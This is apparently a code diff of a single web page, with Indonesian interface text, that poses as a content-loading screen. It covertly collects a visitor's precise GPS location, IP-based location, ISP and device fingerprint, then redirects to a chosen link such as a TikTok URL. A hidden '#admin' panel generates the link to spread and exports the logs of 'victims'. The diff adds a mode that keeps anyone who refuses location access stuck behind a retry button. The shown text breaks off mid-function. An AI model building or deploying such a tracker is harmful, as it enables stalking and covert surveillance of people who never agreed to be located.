@@ -6,479 +6,100 @@
 <title>Loading...</title>
 <style>
   :root {
-    --bg: #0a0a0f;
-    --surface: #111118;
-    --border: #1e1e2e;
-    --accent: #6c63ff;
-    --accent2: #ff6584;
-    --text: #e2e2f0;
-    --muted: #5a5a7a;
-    --green: #00d68f;
-    --red: #ff4757;
-    --font: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    --bg: #0a0a0f; --surface: #111118; --border: #1e1e2e;
+    --accent: #6c63ff; --accent2: #ff6584; --text: #e2e2f0;
+    --muted: #5a5a7a; --green: #00d68f; --red: #ff4757;
+    --font: 'Segoe UI', system-ui, sans-serif;
   }
-
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--font);
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
-
-  /* ── ADMIN PANEL ── */
-  #admin-panel {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: var(--bg);
-    z-index: 9999;
-    overflow-y: auto;
-  }
-
-  #admin-panel.visible { display: block; }
-
-  .admin-header {
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-    padding: 18px 28px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-    position: sticky;
-    top: 0;
-    z-index: 10;
-  }
-
-  .admin-header h1 {
-    font-size: 15px;
-    font-weight: 600;
-    color: var(--accent);
-    letter-spacing: 0.04em;
-  }
-
-  .dot {
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    background: var(--accent);
-    animation: pulse 2s ease-in-out infinite;
-  }
-
-  @keyframes pulse {
-    0%,100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-
-  .admin-body {
-    padding: 28px;
-    max-width: 760px;
-    margin: 0 auto;
-    display: flex;
-    flex-direction: column;
-    gap: 24px;
-  }
-
-  .card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    overflow: hidden;
-  }
-
-  .card-header {
-    padding: 14px 20px;
-    border-bottom: 1px solid var(--border);
-    font-size: 11px;
-    font-weight: 600;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-  }
-
-  .card-body { padding: 20px; }
-
-  .field-row {
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-    margin-bottom: 16px;
-  }
-
-  .field-row:last-child { margin-bottom: 0; }
-
-  label {
-    font-size: 12px;
-    color: var(--muted);
-    font-weight: 500;
-  }
-
-  input[type="text"], input[type="url"], select {
-    width: 100%;
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 10px 14px;
-    color: var(--text);
-    font-size: 13px;
-    font-family: var(--font);
-    transition: border-color 0.2s;
-    outline: none;
-  }
-
-  input:focus, select:focus {
-    border-color: var(--accent);
-  }
-
-  .toggle-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 10px 0;
-  }
-
-  .toggle-label {
-    font-size: 13px;
-    color: var(--text);
-  }
-
-  .toggle-sub {
-    font-size: 11px;
-    color: var(--muted);
-    margin-top: 2px;
-  }
-
-  .toggle {
-    position: relative;
-    width: 42px;
-    height: 24px;
-    flex-shrink: 0;
-  }
-
-  .toggle input { display: none; }
-
-  .toggle-slider {
-    position: absolute;
-    inset: 0;
-    background: var(--border);
-    border-radius: 24px;
-    cursor: pointer;
-    transition: background 0.2s;
-  }
-
-  .toggle-slider::after {
-    content: '';
-    position: absolute;
-    width: 18px; height: 18px;
-    border-radius: 50%;
-    background: var(--muted);
-    top: 3px; left: 3px;
-    transition: all 0.2s;
-  }
-
-  .toggle input:checked + .toggle-slider {
-    background: var(--accent);
-  }
-
-  .toggle input:checked + .toggle-slider::after {
-    transform: translateX(18px);
-    background: #fff;
-  }
-
-  .btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    padding: 10px 18px;
-    border-radius: 8px;
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
-    border: none;
-    transition: all 0.15s;
-    font-family: var(--font);
-  }
-
-  .btn-primary {
-    background: var(--accent);
-    color: #fff;
-  }
-
-  .btn-primary:hover { background: #7c74ff; }
-
-  .btn-danger {
-    background: transparent;
-    color: var(--red);
-    border: 1px solid var(--red);
-  }
-
-  .btn-danger:hover {
-    background: var(--red);
-    color: #fff;
-  }
-
-  .btn-sm {
-    padding: 6px 12px;
-    font-size: 11px;
-  }
-
-  .link-display {
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 12px 16px;
-    font-size: 12px;
-    color: var(--muted);
-    word-break: break-all;
-    font-family: 'Courier New', monospace;
-  }
-
-  .link-display span {
-    color: var(--accent);
-  }
-
-  .copy-btn {
-    margin-top: 10px;
-    background: transparent;
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 7px 14px;
-    border-radius: 6px;
-    font-size: 12px;
-    cursor: pointer;
-    font-family: var(--font);
-    transition: all 0.15s;
-  }
-
-  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
-
-  /* ── LOGS TABLE ── */
-  .log-table {
-    width: 100%;
-    border-collapse: collapse;
-    font-size: 12px;
-  }
-
-  .log-table th {
-    text-align: left;
-    padding: 8px 12px;
-    color: var(--muted);
-    font-weight: 600;
-    border-bottom: 1px solid var(--border);
-    font-size: 11px;
-    text-transform: uppercase;
-    letter-spacing: 0.06em;
-  }
-
-  .log-table td {
-    padding: 10px 12px;
-    border-bottom: 1px solid rgba(30,30,46,0.5);
-    vertical-align: top;
-  }
-
-  .log-table tr:last-child td { border-bottom: none; }
-
-  .log-table tr:hover td { background: rgba(108,99,255,0.04); }
-
-  .coord-val {
-    font-family: 'Courier New', monospace;
-    color: var(--green);
-    font-size: 11px;
-  }
-
-  .acc-badge {
-    display: inline-block;
-    padding: 2px 7px;
-    border-radius: 20px;
-    font-size: 10px;
-    font-weight: 600;
-  }
-
-  .acc-high { background: rgba(0,214,143,0.12); color: var(--green); }
-  .acc-low  { background: rgba(255,71,87,0.12); color: var(--red); }
-
-  .empty-state {
-    text-align: center;
-    padding: 40px 20px;
-    color: var(--muted);
-    font-size: 13px;
-  }
-
-  .action-bar {
-    display: flex;
-    gap: 10px;
-    align-items: center;
-    flex-wrap: wrap;
-  }
-
-  .status-indicator {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 12px;
-    color: var(--muted);
-  }
-
-  .status-dot {
-    width: 6px; height: 6px;
-    border-radius: 50%;
-  }
-
-  .status-dot.active { background: var(--green); }
-  .status-dot.inactive { background: var(--muted); }
-
-  /* ── MAP LINK ── */
-  .map-link {
-    color: var(--accent);
-    text-decoration: none;
-    font-size: 11px;
-  }
-
-  .map-link:hover { text-decoration: underline; }
-
-  /* ── VICTIM PAGE ── */
-  #victim-page {
-    display: flex;
-    flex: 1;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    position: relative;
-    overflow: hidden;
-  }
-
-  #victim-page.hidden { display: none; }
-
-  .victim-bg {
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(ellipse at 30% 50%, rgba(108,99,255,0.06) 0%, transparent 60%),
-                radial-gradient(ellipse at 70% 80%, rgba(255,101,132,0.04) 0%, transparent 50%),
-                var(--bg);
-  }
-
-  .loading-card {
-    position: relative;
-    z-index: 1;
-    text-align: center;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 20px;
-    padding: 20px;
-  }
-
-  .spinner-wrap {
-    position: relative;
-    width: 64px;
-    height: 64px;
-  }
-
-  .spinner-ring {
-    position: absolute;
-    inset: 0;
-    border-radius: 50%;
-    border: 2px solid transparent;
-    animation: spin 1.2s linear infinite;
-  }
-
-  .spinner-ring.r1 {
-    border-top-color: var(--accent);
-    animation-duration: 1.2s;
-  }
-
-  .spinner-ring.r2 {
-    inset: 8px;
-    border-right-color: var(--accent2);
-    animation-duration: 0.9s;
-    animation-direction: reverse;
-  }
-
-  .spinner-ring.r3 {
-    inset: 18px;
-    border-bottom-color: rgba(108,99,255,0.4);
-    animation-duration: 1.6s;
-  }
-
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-
-  .loading-title {
-    font-size: 15px;
-    font-weight: 600;
-    color: var(--text);
-  }
-
-  .loading-sub {
-    font-size: 12px;
-    color: var(--muted);
-    max-width: 220px;
-    line-height: 1.6;
-  }
-
-  .progress-bar {
-    width: 200px;
-    height: 2px;
-    background: var(--border);
-    border-radius: 2px;
-    overflow: hidden;
-  }
-
-  .progress-fill {
-    height: 100%;
-    background: linear-gradient(90deg, var(--accent), var(--accent2));
-    border-radius: 2px;
-    animation: progress 2.5s ease-in-out forwards;
-  }
-
-  @keyframes progress {
-    0% { width: 0%; }
-    40% { width: 55%; }
-    70% { width: 75%; }
-    100% { width: 95%; }
-  }
-
-  /* ── TOAST ── */
-  #toast {
-    position: fixed;
-    bottom: 24px;
-    left: 50%;
-    transform: translateX(-50%) translateY(60px);
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 10px 18px;
-    font-size: 13px;
-    color: var(--text);
-    z-index: 99999;
-    transition: transform 0.3s ease;
-    white-space: nowrap;
-  }
-
-  #toast.show { transform: translateX(-50%) translateY(0); }
-
-  /* ── SCROLLBAR ── */
-  ::-webkit-scrollbar { width: 6px; }
-  ::-webkit-scrollbar-track { background: transparent; }
-  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
-  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
-
-  /* ── RESPONSIVE ── */
-  @media (max-width: 600px) {
-    .admin-body { padding: 16px; }
-    .log-table { font-size: 11px; }
-    .log-table th, .log-table td { padding: 8px 8px; }
-  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:var(--font); min-height:100vh; display:flex; flex-direction:column; }
+
+  /* VICTIM */
+  #victim-page { display:flex; flex:1; align-items:center; justify-content:center; min-height:100vh; position:relative; overflow:hidden; }
+  #victim-page.hidden { display:none; }
+  .victim-bg { position:absolute; inset:0; background:radial-gradient(ellipse at 30% 50%,rgba(108,99,255,.06) 0%,transparent 60%),radial-gradient(ellipse at 70% 80%,rgba(255,101,132,.04) 0%,transparent 50%),var(--bg); }
+  .loading-card { position:relative; z-index:1; text-align:center; display:flex; flex-direction:column; align-items:center; gap:18px; padding:20px; }
+  .spinner-wrap { position:relative; width:64px; height:64px; }
+  .spinner-ring { position:absolute; inset:0; border-radius:50%; border:2px solid transparent; animation:spin 1.2s linear infinite; }
+  .spinner-ring.r1 { border-top-color:var(--accent); animation-duration:1.2s; }
+  .spinner-ring.r2 { inset:8px; border-right-color:var(--accent2); animation-duration:.9s; animation-direction:reverse; }
+  .spinner-ring.r3 { inset:18px; border-bottom-color:rgba(108,99,255,.4); animation-duration:1.6s; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .loading-title { font-size:15px; font-weight:600; }
+  .loading-sub { font-size:12px; color:var(--muted); max-width:220px; line-height:1.6; }
+  .progress-bar { width:200px; height:2px; background:var(--border); border-radius:2px; overflow:hidden; }
+  .progress-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:2px; width:0%; transition:width .4s ease; }
+
+  /* BLOCKED STATE */
+  .blocked-msg { display:none; flex-direction:column; align-items:center; gap:12px; margin-top:4px; }
+  .blocked-msg.show { display:flex; }
+  .blocked-icon { font-size:32px; }
+  .blocked-text { font-size:13px; color:var(--muted); max-width:220px; line-height:1.6; }
+  .retry-btn { margin-top:4px; background:var(--accent); color:#fff; border:none; border-radius:8px; padding:10px 20px; font-size:13px; font-weight:600; cursor:pointer; font-family:var(--font); }
+
+  /* ADMIN */
+  #admin-panel { display:none; position:fixed; inset:0; background:var(--bg); z-index:9999; overflow-y:auto; }
+  #admin-panel.visible { display:block; }
+  .admin-header { background:var(--surface); border-bottom:1px solid var(--border); padding:16px 24px; display:flex; align-items:center; gap:10px; position:sticky; top:0; z-index:10; }
+  .admin-header h1 { font-size:14px; font-weight:600; color:var(--accent); }
+  .dot { width:8px; height:8px; border-radius:50%; background:var(--accent); animation:pulse 2s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{opacity:1}50%{opacity:.3} }
+  .admin-body { padding:24px; max-width:960px; margin:0 auto; display:flex; flex-direction:column; gap:20px; }
+  .card { background:var(--surface); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
+  .card-header { padding:12px 18px; border-bottom:1px solid var(--border); font-size:11px; font-weight:600; color:var(--muted); text-transform:uppercase; letter-spacing:.08em; display:flex; align-items:center; justify-content:space-between; }
+  .card-body { padding:18px; }
+  .field-row { display:flex; flex-direction:column; gap:6px; margin-bottom:14px; }
+  .field-row:last-child { margin-bottom:0; }
+  label { font-size:12px; color:var(--muted); font-weight:500; }
+  input[type="text"],input[type="url"] { width:100%; background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:9px 12px; color:var(--text); font-size:13px; font-family:var(--font); outline:none; transition:border-color .2s; }
+  input:focus { border-color:var(--accent); }
+  .toggle-row { display:flex; align-items:center; justify-content:space-between; padding:8px 0; }
+  .toggle-label { font-size:13px; }
+  .toggle-sub { font-size:11px; color:var(--muted); margin-top:2px; }
+  .toggle { position:relative; width:42px; height:24px; flex-shrink:0; }
+  .toggle input { display:none; }
+  .toggle-slider { position:absolute; inset:0; background:var(--border); border-radius:24px; cursor:pointer; transition:background .2s; }
+  .toggle-slider::after { content:''; position:absolute; width:18px; height:18px; border-radius:50%; background:var(--muted); top:3px; left:3px; transition:all .2s; }
+  .toggle input:checked + .toggle-slider { background:var(--accent); }
+  .toggle input:checked + .toggle-slider::after { transform:translateX(18px); background:#fff; }
+  .btn { display:inline-flex; align-items:center; gap:6px; padding:9px 16px; border-radius:8px; font-size:13px; font-weight:600; cursor:pointer; border:none; transition:all .15s; font-family:var(--font); }
+  .btn-primary { background:var(--accent); color:#fff; }
+  .btn-primary:hover { background:#7c74ff; }
+  .btn-danger { background:transparent; color:var(--red); border:1px solid var(--red); }
+  .btn-danger:hover { background:var(--red); color:#fff; }
+  .btn-sm { padding:5px 10px; font-size:11px; }
+  .link-display { background:var(--bg); border:1px solid var(--border); border-radius:8px; padding:10px 14px; font-size:12px; color:var(--accent); word-break:break-all; font-family:monospace; }
+  .copy-btn { margin-top:8px; background:transparent; border:1px solid var(--border); color:var(--text); padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer; font-family:var(--font); transition:all .15s; }
+  .copy-btn:hover { border-color:var(--accent); color:var(--accent); }
+  .action-bar { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
+
+  /* LOG TABLE */
+  .log-wrap { overflow-x:auto; }
+  .log-table { width:100%; border-collapse:collapse; font-size:11px; min-width:860px; }
+  .log-table th { text-align:left; padding:8px 10px; color:var(--muted); font-weight:600; border-bottom:1px solid var(--border); font-size:10px; text-transform:uppercase; letter-spacing:.06em; white-space:nowrap; }
+  .log-table td { padding:9px 10px; border-bottom:1px solid rgba(30,30,46,.5); vertical-align:top; }
+  .log-table tr:last-child td { border-bottom:none; }
+  .log-table tr:hover td { background:rgba(108,99,255,.04); }
+  .coord-val { font-family:monospace; color:var(--green); font-size:11px; }
+  .ip-val { font-family:monospace; color:#f0a500; font-size:11px; }
+  .acc-badge { display:inline-block; padding:2px 7px; border-radius:20px; font-size:10px; font-weight:600; white-space:nowrap; }
+  .acc-high { background:rgba(0,214,143,.12); color:var(--green); }
+  .acc-low  { background:rgba(255,71,87,.12); color:var(--red); }
+  .acc-mid  { background:rgba(240,165,0,.12); color:#f0a500; }
+  .map-link { color:var(--accent); text-decoration:none; font-size:10px; }
+  .map-link:hover { text-decoration:underline; }
+  .empty-state { text-align:center; padding:40px; color:var(--muted); font-size:13px; }
+
+  #toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(60px); background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:9px 16px; font-size:13px; z-index:99999; transition:transform .3s; white-space:nowrap; }
+  #toast.show { transform:translateX(-50%) translateY(0); }
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background:transparent; }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
 </style>
 </head>
 <body>
 
-<!-- ══════════════════════════════════════
-     VICTIM PAGE (default view)
-══════════════════════════════════════ -->
+<!-- VICTIM PAGE -->
 <div id="victim-page">
   <div class="victim-bg"></div>
   <div class="loading-card">
@@ -491,315 +112,261 @@
       <div class="loading-title" id="loading-title">Memuat konten...</div>
       <div class="loading-sub" id="loading-sub">Mohon tunggu sebentar</div>
     </div>
-    <div class="progress-bar">
-      <div class="progress-fill"></div>
+    <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+    <div class="blocked-msg" id="blocked-msg">
+      <div class="blocked-icon">🔒</div>
+      <div class="blocked-text">Akses lokasi diperlukan untuk membuka konten ini.</div>
+      <button class="retry-btn" onclick="retryGeo()">Izinkan & Lanjutkan</button>
     </div>
   </div>
 </div>
 
-<!-- ══════════════════════════════════════
-     ADMIN PANEL
-══════════════════════════════════════ -->
+<!-- ADMIN PANEL -->
 <div id="admin-panel">
   <div class="admin-header">
     <div class="dot"></div>
     <h1>Location Panel</h1>
-    <div style="margin-left:auto; display:flex; gap:10px; align-items:center;">
-      <div class="status-indicator" id="geo-status">
-        <div class="status-dot inactive" id="geo-dot"></div>
-        <span id="geo-label">Geo: Standby</span>
-      </div>
-      <button class="btn btn-sm" style="background:var(--border);color:var(--text);border:none;" onclick="exitAdmin()">
-        ✕ Keluar
-      </button>
+    <div style="margin-left:auto;display:flex;gap:10px;align-items:center;">
+      <span style="font-size:11px;color:var(--muted)" id="live-ind">● Standby</span>
+      <button class="btn btn-sm" style="background:var(--border);color:var(--text);border:none;" onclick="exitAdmin()">✕ Keluar</button>
     </div>
   </div>
-
   <div class="admin-body">
 
-    <!-- CONFIG -->
     <div class="card">
-      <div class="card-header">Konfigurasi Link</div>
+      <div class="card-header">Konfigurasi</div>
       <div class="card-body">
         <div class="field-row">
-          <label>Target URL (redirect tujuan)</label>
-          <input type="url" id="target-url" placeholder="https://vt.tiktok.com/xxxxx atau link apapun"
-                 value="" oninput="updatePreview()">
+          <label>Target URL</label>
+          <input type="url" id="target-url" placeholder="https://vt.tiktok.com/xxxxx">
         </div>
         <div class="field-row">
-          <label>Teks loading (yang dilihat korban)</label>
-          <input type="text" id="loading-text" placeholder="Memuat konten..."
-                 value="Memuat konten...">
+          <label>Teks loading</label>
+          <input type="text" id="loading-text" value="Memuat konten...">
         </div>
         <div class="field-row">
           <label>Sub-teks loading</label>
-          <input type="text" id="loading-subtext" placeholder="Mohon tunggu sebentar"
-                 value="Mohon tunggu sebentar">
+          <input type="text" id="loading-subtext" value="Mohon tunggu sebentar">
         </div>
         <div class="field-row">
-          <label>Delay redirect (detik)</label>
-          <input type="text" id="delay-sec" placeholder="3" value="3" style="width:80px">
+          <label>Pesan saat ditolak (muncul di bawah tombol retry)</label>
+          <input type="text" id="blocked-text-cfg" value="Akses lokasi diperlukan untuk membuka konten ini.">
         </div>
-
-        <div style="border-top:1px solid var(--border); margin: 16px 0 16px;"></div>
-
+        <div style="border-top:1px solid var(--border);margin:14px 0;"></div>
         <div class="toggle-row">
-          <div>
-            <div class="toggle-label">Minta geolokasi</div>
-            <div class="toggle-sub">Browser akan prompt izin lokasi</div>
-          </div>
-          <label class="toggle">
-            <input type="checkbox" id="toggle-geo" checked>
-            <span class="toggle-slider"></span>
-          </label>
+          <div><div class="toggle-label">High accuracy GPS</div><div class="toggle-sub">Lebih akurat, prompt muncul lebih cepat</div></div>
+          <label class="toggle"><input type="checkbox" id="toggle-high-acc" checked><span class="toggle-slider"></span></label>
         </div>
-
         <div class="toggle-row">
-          <div>
-            <div class="toggle-label">High accuracy GPS</div>
-            <div class="toggle-sub">enableHighAccuracy — lebih akurat, lebih lambat</div>
-          </div>
-          <label class="toggle">
-            <input type="checkbox" id="toggle-high-acc" checked>
-            <span class="toggle-slider"></span>
-          </label>
+          <div><div class="toggle-label">Block redirect jika tolak izin</div><div class="toggle-sub">Korban tidak bisa ke tujuan tanpa izin lokasi</div></div>
+          <label class="toggle"><input type="checkbox" id="toggle-block" checked><span class="toggle-slider"></span></label>
         </div>
-
-        <div class="toggle-row">
-          <div>
-            <div class="toggle-label">Tetap redirect walau lokasi gagal</div>
-            <div class="toggle-sub">Jika korban tolak/timeout, tetap diarahkan</div>
-          </div>
-          <label class="toggle">
-            <input type="checkbox" id="toggle-force-redirect" checked>
-            <span class="toggle-slider"></span>
-          </label>
-        </div>
-
-        <div style="margin-top:20px;">
-          <button class="btn btn-primary" onclick="saveConfig()">Simpan & Generate Link</button>
+        <div style="margin-top:16px;">
+          <button class="btn btn-primary" onclick="saveConfig()">Simpan</button>
         </div>
       </div>
     </div>
 
-    <!-- GENERATED LINK -->
-    <div class="card" id="link-card" style="display:none">
-      <div class="card-header">Link yang Disebarkan</div>
+    <div class="card" id="link-card">
+      <div class="card-header">Link Sebar</div>
       <div class="card-body">
-        <div class="link-display" id="generated-link-display">—</div>
-        <button class="copy-btn" onclick="copyLink()">Salin link</button>
-        <p style="font-size:11px;color:var(--muted);margin-top:12px;">
-          Sebarkan link ini. Saat dibuka, browser minta izin lokasi → data masuk ke log → redirect ke target.
-        </p>
+        <div class="link-display" id="link-display">—</div>
+        <button class="copy-btn" onclick="copyLink()">Salin</button>
+        <p style="font-size:11px;color:var(--muted);margin-top:10px;">Tanpa #admin di belakang. Korban buka → prompt izin muncul seketika → data masuk → redirect.</p>
       </div>
     </div>
 
-    <!-- LOG -->
     <div class="card">
-      <div class="card-header" style="display:flex;align-items:center;justify-content:space-between;">
-        <span>Log Lokasi</span>
+      <div class="card-header">
+        <span>Log</span>
         <div class="action-bar">
           <span style="font-size:11px;color:var(--muted)" id="log-count">0 entri</span>
-          <button class="btn btn-sm btn-danger" onclick="clearLogs()">Hapus semua</button>
-          <button class="btn btn-sm" style="background:var(--accent);color:#fff;border:none;" onclick="exportCSV()">Export CSV</button>
+          <button class="btn btn-sm btn-danger" onclick="clearLogs()">Hapus</button>
+          <button class="btn btn-sm btn-primary" onclick="exportCSV()">Export CSV</button>
         </div>
       </div>
-      <div class="card-body" style="padding:0; overflow-x:auto;">
-        <div id="log-container">
-          <div class="empty-state">Belum ada data. Tunggu korban buka link.</div>
-        </div>
+      <div class="log-wrap">
+        <div id="log-container"><div class="empty-state">Belum ada data.</div></div>
       </div>
     </div>
 
   </div>
 </div>
 
-<!-- TOAST -->
 <div id="toast"></div>
 
 <script>
-// ══════════════════════════════════════
-//  CONFIG & STATE
-// ══════════════════════════════════════
-const ADMIN_CODE = '#admin';        // buka panel dengan tambah #admin di URL
-const STORAGE_KEY = 'lp_config_v1';
-const LOG_KEY     = 'lp_logs_v1';
+const ADMIN_HASH  = '#admin';
+const STORAGE_KEY = 'lp_cfg_v2';
+const LOG_KEY     = 'lp_log_v2';
 
 let config = {
   targetUrl: '',
   loadingText: 'Memuat konten...',
   loadingSub: 'Mohon tunggu sebentar',
-  delaySec: 3,
-  geoEnabled: true,
+  blockedText: 'Akses lokasi diperlukan untuk membuka konten ini.',
   highAccuracy: true,
-  forceRedirect: true,
+  blockOnDeny: true,
 };
-
 let logs = [];
+let ipCache = null;
 
-// ══════════════════════════════════════
-//  INIT
-// ══════════════════════════════════════
-(function init() {
-  loadConfig();
-  loadLogs();
+// ── INIT ──
+loadConfig();
+loadLogs();
 
-  // cek apakah admin mode
-  if (window.location.hash === ADMIN_CODE) {
-    showAdmin();
-    return;
-  }
-
-  // mode victim
-  runVictimFlow();
-})();
-
-// ══════════════════════════════════════
-//  VICTIM FLOW
-// ══════════════════════════════════════
-async function getIPData() {
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    if (!r.ok) return {};
-    const d = await r.json();
-    return {
-      ip:            d.ip           || null,
-      ipCity:        d.city         || null,
-      ipRegion:      d.region       || null,
-      ipCountry:     d.country_name || null,
-      ipCountryCode: d.country      || null,
-      ipISP:         d.org          || null,
-      ipLat:         d.latitude     || null,
-      ipLng:         d.longitude    || null,
-      ipTimezone:    d.timezone     || null,
-      ipPostal:      d.postal       || null,
-    };
-  } catch { return {}; }
+if (window.location.hash === ADMIN_HASH) {
+  showAdmin();
+} else {
+  initVictim();
 }
 
-function buildDeviceData() {
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  return {
-    ua:       navigator.userAgent,
-    screen:   `${screen.width}x${screen.height}`,
-    lang:     navigator.language,
-    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ram:      navigator.deviceMemory ? `${navigator.deviceMemory}GB` : null,
-    cpu:      navigator.hardwareConcurrency || null,
-    touch:    navigator.maxTouchPoints > 0,
-    connType: conn ? (conn.effectiveType || conn.type || null) : null,
-    connDown: conn ? conn.downlink || null : null,
-    referrer: document.referrer || null,
-  };
+// ── VICTIM ──
+function initVictim() {
+  document.getElementById('loading-title').textContent = config.loadingText;
+  document.getElementById('loading-sub').textContent   = config.loadingSub;
+  document.getElementById('blocked-msg').querySelector('.blocked-text').textContent = config.blockedText;
+
+  // IP lookup paralel — tanpa izin
+  fetchIP();
+
+  // trigger geolocation SEGERA — sebelum animasi apapun
+  // ini biar browser prompt izin muncul secepat mungkin
+  requestGeo();
 }
 
-async function runVictimFlow() {
-  document.getElementById('loading-title').textContent = config.loadingText || 'Memuat konten...';
-  document.getElementById('loading-sub').textContent   = config.loadingSub  || 'Mohon tunggu sebentar';
+function setProgress(pct, animated) {
+  const el = document.getElementById('progress-fill');
+  if (!animated) el.style.transition = 'none';
+  else el.style.transition = 'width .4s ease';
+  el.style.width = pct + '%';
+}
 
-  const delay = (config.delaySec || 3) * 1000;
-
-  // IP lookup tanpa izin — jalan paralel
-  const ipPromise = getIPData();
-  const deviceData = buildDeviceData();
-
-  if (!config.geoEnabled) {
-    const ipData = await ipPromise;
-    saveLog({ ts: new Date().toISOString(), ...deviceData, ...ipData });
-    setTimeout(() => doRedirect(), delay);
-    return;
-  }
-
+function requestGeo() {
+  // langsung panggil tanpa delay
   if (!navigator.geolocation) {
-    const ipData = await ipPromise;
-    saveLog({ ts: new Date().toISOString(), error: 'Geolocation not supported', ...deviceData, ...ipData });
-    setTimeout(() => doRedirect(), delay);
+    onGeoError({ code: 0, message: 'Not supported' });
     return;
   }
-
-  const geoOptions = {
+  setProgress(15, true);
+  navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
     enableHighAccuracy: config.highAccuracy,
-    timeout: 8000,
+    timeout: 10000,
     maximumAge: 0,
+  });
+}
+
+function retryGeo() {
+  document.getElementById('blocked-msg').classList.remove('show');
+  document.getElementById('loading-sub').textContent = config.loadingSub;
+  setProgress(15, true);
+  requestGeo();
+}
+
+async function onGeoSuccess(pos) {
+  setProgress(80, true);
+  const ip = await getIP();
+  const dev = getDevice();
+  const entry = {
+    ts:       new Date().toISOString(),
+    lat:      pos.coords.latitude,
+    lng:      pos.coords.longitude,
+    accuracy: pos.coords.accuracy,
+    ...dev,
+    ...ip,
   };
+  saveLog(entry);
+  setProgress(100, true);
+  setTimeout(() => doRedirect(), 600);
+}
 
-  let redirectTriggered = false;
+async function onGeoError(err) {
+  const ip = await getIP();
+  const dev = getDevice();
+  const errLabel = err.code === 1 ? 'Ditolak' : err.code === 2 ? 'Tidak tersedia' : err.code === 3 ? 'Timeout' : 'Tidak didukung';
+  saveLog({
+    ts: new Date().toISOString(),
+    error: errLabel,
+    code: err.code,
+    ...dev,
+    ...ip,
+  });
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const ipData = await ipPromise;
-      const entry = {
-        ts:       new Date().toISOString(),
-        lat:      pos.coords.latitude,
-        lng:      pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        altitude: pos.coords.altitude,
-        ...deviceData,
-        ...ipData,
-      };
-      saveLog(entry);
-
-      if (!redirectTriggered) {
-        redirectTriggered = true;
-        const remaining = delay - 500;
-        setTimeout(() => doRedirect(), remaining > 0 ? remaining : 300);
-      }
-    },
-    async (err) => {
-      const ipData = await ipPromise;
-      const entry = {
-        ts:    new Date().toISOString(),
-        error: err.message,
-        code:  err.code,
-        ...deviceData,
-        ...ipData,
-      };
-      saveLog(entry);
-
-      if (!redirectTriggered && config.forceRedirect) {
-        redirectTriggered = true;
-        setTimeout(() => doRedirect(), 500);
-      }
-    },
-    geoOptions
-  );
-
-  setTimeout(() => {
-    if (!redirectTriggered && config.forceRedirect) {
-      redirectTriggered = true;
-      doRedirect();
-    }
-  }, delay + 1000);
+  if (config.blockOnDeny) {
+    // stuck — tunjukkan pesan + tombol retry
+    setProgress(35, true);
+    document.getElementById('loading-sub').textContent = '';
+    document.getElementById('blocked-msg').classList.add('show');
+  } else {
+    setProgress(100, true);
+    setTimeout(() => doRedirect(), 600);
+  }
 }
 
 function doRedirect() {
-  const url = config.targetUrl;
-  if (!url || url.trim() === '') {
-    // tidak ada target — diam saja atau tunjukkan error
-    document.getElementById('loading-title').textContent = 'Siap.';
-    document.getElementById('loading-sub').textContent   = 'Tidak ada redirect yang dikonfigurasi.';
-    return;
-  }
-  window.location.href = url;
+  if (!config.targetUrl) return;
+  window.location.href = config.targetUrl;
 }
 
-// ══════════════════════════════════════
-//  ADMIN
-// ══════════════════════════════════════
+// ── DATA COLLECTION ──
+async function fetchIP() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    ipCache = r.ok ? await r.json() : {};
+  } catch { ipCache = {}; }
+}
+
+async function getIP() {
+  if (ipCache === null) await fetchIP();
+  const d = ipCache || {};
+  return {
+    ip:        d.ip           || null,
+    ipCity:    d.city         || null,
+    ipRegion:  d.region       || null,
+    ipCountry: d.country_name || null,
